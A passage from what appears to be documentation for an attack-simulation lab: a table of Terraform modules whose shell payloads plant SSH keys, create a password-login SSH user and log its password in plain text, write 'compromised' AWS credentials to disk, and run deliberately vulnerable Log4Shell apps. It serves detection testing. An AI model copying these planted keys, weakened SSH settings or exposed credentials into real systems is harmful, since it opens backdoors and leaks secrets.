| ModuleName                                                                 | Source                                                         | Tag                                        | ConfigPath                                                                | ConfigOptionsDefault                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | PayloadPath                                                                                                                    | Payload                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
|:---------------------------------------------------------------------------|:---------------------------------------------------------------|:-------------------------------------------|:--------------------------------------------------------------------------|:---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|:-------------------------------------------------------------------------------------------------------------------------------|:------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| target-ssh-keys                                                            | ./modules/ssm/deploy-ssh-keys                                  | ssm_deploy_secret_ssh_public               | context.aws.ssm.ssh_keys                                                  | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "ssh_keys": {<br/>                    "enabled": false,<br/>                    "ssh_authorized_keys_path": "/home/sshuser/.ssh/authorized_keys",<br/>                    "ssh_private_key_path": "/home/sshuser/.ssh/secret_key",<br/>                    "ssh_public_key_path": "/home/sshuser/.ssh/secret_key.pub"<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-keys                                  | <pre>\# ssh key<br/>resource "tls\_private\_key" "ssh" \{<br/>  algorithm = "RSA"<br/>  rsa\_bits  = "4096"<br/>\}<br/><br/>locals \{<br/>    ssh\_private\_key = base64encode\(tls\_private\_key\.ssh\.private\_key\_pem\)<br/>    ssh\_private\_key\_path = var\.inputs\["ssh\_private\_key\_path"\]<br/>    ssh\_public\_key = base64encode\(chomp\(tls\_private\_key\.ssh\.public\_key\_openssh\)\)<br/>    ssh\_public\_key\_path = var\.inputs\["ssh\_public\_key\_path"\]<br/>    ssh\_authorized\_keys\_path = var\.inputs\["ssh\_authorized\_keys\_path"\]<br/>    public\_key\_user = split\("/", local\.ssh\_public\_key\_path\)\[1\] == "root" ? "root" : split\("/", local\.ssh\_public\_key\_path\)\[2\]<br/>    private\_key\_user = split\("/", local\.ssh\_private\_key\_path\)\[1\] == "root" ? "root" : split\("/", local\.ssh\_private\_key\_path\)\[2\]<br/><br/>    payload\_public = <<\-EOT<br/>    log "starting script"<br/>    log "creating public key: $\{local\.ssh\_public\_key\_path\}"<br/>    log "adding user: $\{local\.public\_key\_user\}\.\.\."<br/>    adduser \-\-gecos "" \-\-disabled\-password "$\{local\.public\_key\_user\}" \|\| log "$\{local\.public\_key\_user\} user already exists"<br/>    mkdir \-p $\{dirname\(local\.ssh\_public\_key\_path\)\}<br/>    chown \-R $\{local\.public\_key\_user\}:$\{local\.public\_key\_user\} $\{dirname\(local\.ssh\_public\_key\_path\)\}<br/>    echo '$\{base64decode\(local\.ssh\_public\_key\)\}' > $\{local\.ssh\_public\_key\_path\}<br/>    echo '$\{base64decode\(local\.ssh\_public\_key\)\}' >> $\{local\.ssh\_authorized\_keys\_path\}<br/>    sort $\{local\.ssh\_authorized\_keys\_path\} \| uniq > $\{local\.ssh\_authorized\_keys\_path\}\.uniq<br/>    mv $\{local\.ssh\_authorized\_keys\_path\}\.uniq $\{local\.ssh\_authorized\_keys\_path\}<br/>    chmod 600 $\{local\.ssh\_public\_key\_path\} $\{local\.ssh\_authorized\_keys\_path\}<br/>    chown \-R $\{local\.public\_key\_user\}:$\{local\.public\_key\_user\} $\{local\.ssh\_public\_key\_path\} $\{local\.ssh\_authorized\_keys\_path\}<br/>    log "public key: $\(ls \-l $\{local\.ssh\_public\_key\_path\}\)"<br/>    log "authorized key: $\(ls \-l $\{local\.ssh\_authorized\_keys\_path\}\)"<br/>    log "done"<br/>    EOT<br/>    base64\_payload\_public = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["public\_tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload\_public<br/>    \}\}\)<br/><br/>    payload\_private = <<\-EOT<br/>    log "starting script"<br/>    log "creating private key: $\{local\.ssh\_private\_key\_path\}"<br/>    log "adding user: $\{local\.private\_key\_user\}\.\.\."<br/>    adduser \-\-gecos "" \-\-disabled\-password "$\{local\.private\_key\_user\}" \|\| log "$\{local\.private\_key\_user\} user already exists"<br/>    mkdir \-p $\{dirname\(local\.ssh\_private\_key\_path\)\}<br/>    echo '$\{base64decode\(local\.ssh\_private\_key\)\}' > $\{local\.ssh\_private\_key\_path\}<br/>    chmod 600 $\{local\.ssh\_private\_key\_path\}<br/>    chown $\{local\.private\_key\_user\}:$\{local\.private\_key\_user\} $\{local\.ssh\_private\_key\_path\}<br/>    log "private key: $\(ls \-l $\{local\.ssh\_private\_key\_path\}\)"<br/>    log "done"<br/>    EOT<br/>    base64\_payload\_private = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["private\_tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload\_private<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload\_public = base64gzip\(local\.base64\_payload\_public\)<br/>        base64\_uncompressed\_payload\_public = base64encode\(local\.base64\_payload\_public\)<br/>        base64\_payload\_private = base64gzip\(local\.base64\_payload\_private\)<br/>        base64\_uncompressed\_payload\_private = base64encode\(local\.base64\_payload\_private\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| target-deploy-ssh-user                                                     | ./modules/ssm/deploy-ssh-user                                  | ssm_deploy_ssh_user                        | context.aws.ssm.ssh_user                                                  | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "ssh_user": {<br/>                    "enabled": false,<br/>                    "password": null,<br/>                    "username": "lou.caloozer"<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-user                                  | <pre>locals \{<br/>    password = try\(length\(var\.inputs\["password"\]\),"false"\) \!= "false" ? var\.inputs\["password"\] :  random\_password\.password\.result<br/>    payload = <<\-EOT<br/>    log "starting script"<br/>    log "Setting up user: $\{var\.inputs\["username"\]\}"<br/>    adduser \-\-gecos "" \-\-disabled\-password $\{var\.inputs\["username"\]\} \|\| log "$\{var\.inputs\["username"\]\} user already exists"<br/>    log "Setting passwd: $\{local\.password\}"<br/>    echo '$\{var\.inputs\["username"\]\}:$\{local\.password\}' \| chpasswd<br/>    log "Adding user to allowed passwd auth in sshd\_config\.d"<br/>    cat > /etc/ssh/sshd\_config\.d/common\-user\-passwd\-auth\.conf <<\-EOF <br/>    \# Configuration to allow key authentication only and display a message on password attempt<br/>    Match User root,admin,test,guest,info,adm,mysql,user,administrator,oracle,ftp,pi,puppet,ansible,ec2\-user,vagrant<br/>        AuthenticationMethods publickey<br/>        PasswordAuthentication no<br/>        ForceCommand /bin/echo 'We talked about this guys\. No SSH for you\!'<br/>    EOF<br/>    cat > /etc/ssh/sshd\_config\.d/custom\-user\-passwd\-auth\.conf <<\-EOF <br/>    Match User $\{var\.inputs\["username"\]\}<br/>        AuthenticationMethods publickey password<br/>        PasswordAuthentication yes<br/>    EOF<br/>    log "Restarting ssh service"<br/>    service ssh reload<br/>    log "Done\."<br/>    EOT<br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>        password = local\.password<br/>    \}<br/>\}<br/><br/>resource "random\_password" "password" \{<br/>  length           = 16<br/>  special          = true<br/>  override\_special = "\!\#$%&\*\(\)\-\_=\+\[\]\{\}<>:?"<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| target-aws-credentials                                                     | ./modules/ssm/deploy-aws-credentials                           | ssm_deploy_secret_aws_credentials          | context.aws.ssm.aws_credentials                                           | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "aws_credentials": {<br/>                    "compromised_keys_user": null,<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-aws-credentials                           | <pre>locals \{<br/>    tool = "aws"<br/>    aws\_creds = join\("\\n", \[ for u,k in var\.inputs\["compromised\_credentials"\]: "$\{k\.rendered\}" \]\)<br/>    payload = <<\-EOT<br/>    log "Setting up aws cred environment variables\.\.\."<br/>    $\{local\.aws\_creds\}<br/>    log "Deploying aws credentials\.\.\."<br/>    mkdir \-p ~/\.aws<br/>    cat <<\-EOF > ~/\.aws/credentials<br/>    \[default\]<br/>    aws\_access\_key\_id=$AWS\_ACCESS\_KEY\_ID<br/>    aws\_secret\_access\_key=$AWS\_SECRET\_ACCESS\_KEY<br/>    EOF<br/>    cat <<\-EOF > ~/\.aws/config<br/>    \[default\]<br/>    region=$AWS\_DEFAULT\_REGION<br/>    output=json<br/>    EOF<br/>    log "Running: aws get\-caller\-identity"<br/>    aws sts get\-caller\-identity \-\-output json >> $LOGFILE 2>&1 <br/>    EOT<br/>    <br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = <<\-EOT<br/>        while \! command \-v $\{local\.tool\} &>/dev/null; do<br/>            log "$\{local\.tool\} not found \- waiting";<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  <<\-EOT<br/>        while \! command \-v $\{local\.tool\} &>/dev/null; do<br/>            log "$\{local\.tool\} not found \- waiting";<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| target-vulnerable-docker-log4j-app                                         | ./modules/ssm/deploy-docker-log4j-app                          | ssm_deploy_docker_log4j_app                | context.aws.ssm.vulnerable.docker.log4j_app                               | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "docker": {<br/>                        "log4j_app": {<br/>                            "enabled": false,<br/>                            "listen_port": 8000<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-docker-log4j-app                          | <pre>locals \{<br/>    image = "ghcr\.io/christophetd/log4shell\-vulnerable\-app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929"<br/>    name = "log4shell"<br/>    listen\_port=var\.inputs\["listen\_port"\]<br/>    payload = <<\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        if \[\[ \`sudo docker ps \| grep $\{local\.name\}\` \]\]; then docker stop $\{local\.name\}; fi<br/>        log "$\(echo 'docker run \-d \-\-name $\{local\.name\} \-v /tmp:/tmp \-\-rm \-p $\{local\.listen\_port\}:8080 $\{local\.image\}'\)"<br/>        docker run \-d \-\-name $\{local\.name\} \-v /tmp:/tmp \-\-rm \-p $\{local\.listen\_port\}:8080 $\{local\.image\} >> $LOGFILE 2>&1<br/>        docker ps \-a >> $LOGFILE 2>&1<br/>        sleep 30<br/>        log "check app url\.\.\."<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\["listen\_port"\]\} \| tee \-a $LOGFILE; do<br/>            log "failed to connect to app url http://localhost:$\{var\.inputs\["listen\_port"\]\} \- retrying"<br/>            sleep 60<br/>        done<br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>        fi<br/>    done<br/>    EOT<br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        apt\_packages = "curl"<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        yum\_packages = "curl"<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| target-vulnerable-log4j-app                                                | ./modules/ssm/deploy-log4j-app                                 | ssm_deploy_log4j_app                       | context.aws.ssm.vulnerable.log4j_app                                      | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "log4j_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8080<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-log4j-app                                 | <pre>locals \{<br/>    app\_dir = "/vuln\-log4j\-app"<br/>    listen\_port=var\.inputs\["listen\_port"\]<br/>    payload = <<\-EOT<br/>    screen \-S vuln\_log4j\_app\_target \-X quit<br/>    screen \-wipe<br/>    truncate \-s 0 /tmp/vuln\_log4j\_app\_target\.log<br/>    <br/>    rm \-rf $\{local\.app\_dir\}<br/>    mkdir $\{local\.app\_dir\}<br/>    cd $\{local\.app\_dir\}<br/><br/>    log "creating local files\.\.\."<br/>    echo $\{base64gzip\(local\.web\)\} \| base64 \-d \| gunzip > web\.py<br/>    echo $\{base64gzip\(local\.ldap\)\} \| base64 \-d \| gunzip  > ldap\.py<br/>    echo $\{base64gzip\(local\.requirements\)\} \| base64 \-d \| 